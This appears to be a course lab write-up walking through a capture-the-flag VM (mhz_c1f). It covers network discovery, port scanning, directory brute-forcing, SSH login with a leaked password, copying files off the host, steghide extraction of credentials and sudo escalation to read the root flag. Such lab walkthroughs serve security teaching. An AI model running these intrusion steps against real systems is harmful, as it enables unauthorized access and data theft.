# PROGRAM 8

## Privilege Escalation on Compromised Host

### Using mhz_c1f VM to Enumerate and Obtain Root Information

### Solution

## Step 1: Open mhz_c1f VM

- Come to Kali machine and perform:

```bash
netdiscover
```

- Copy the IP address of PCS SystemTechnik GmbH.
- Perform Nmap on that IP address.

```bash
nmap -p- -A 192.168.1.8
```

Output:

```text
Open Ports: 22, 80
```

- Explore port 80 by typing the IP address in Firefox.

## Step 2: Enumeration

Use Dirb to brute-force directories.

Command:

```bash
dirb http://192.168.1.8/ -X .txt
```

Output:

```text
http://192.168.1.8/notes.txt
```

- Open Firefox and paste the URL.
- It leads to:

```text
remb.txt
```

File containing:

```text
flagitifyoucan1234
```

(password)

## Step 3: System Exploration

We will try to enumerate the SSH port.

Command:

```bash
ssh first_stage@192.168.1.8
```

Password:

```text
flagitifyoucan1234
```

Commands used:

```bash
ls
cat user.txt
cd /home
ls
cd mhz_c1f
ls
Paintings
ls
```

Result:

```text
We have successfully connected to VM using SSH.
```

## Step 4: Data Exfiltration

Open a new tab and type the following commands:

```bash
mkdir mhz
```

```bash
cd mhz
```

```bash
scp first_stage@192.168.1.8:/home/mhz_c1f/Paintings/* .
```

## Step 5: Steganography

Type the following command:

```bash
steghide extract -sf <path of image>
```

- Enter password when prompted (just press enter)  .

Then:

```bash
cat remb2.txt
```

```text
mhz_c1f:1@ec1f
```

## Step 6: Privilege Escalation

Go back to the SSH server and type:

```bash
su mhz_c1f
```

Password:

```text
1@ec1f
```

```bash
id
```

```bash
sudo su
```

Password:

```text
1@ec1f
```

```bash
ls
ls -la
cat .root.txt
```

### Output

```text
Well done sir, you have successfully got the root flag.
I hope you enjoyed this mission.
```

```text
Root flag: RT5G9V3L1X
```
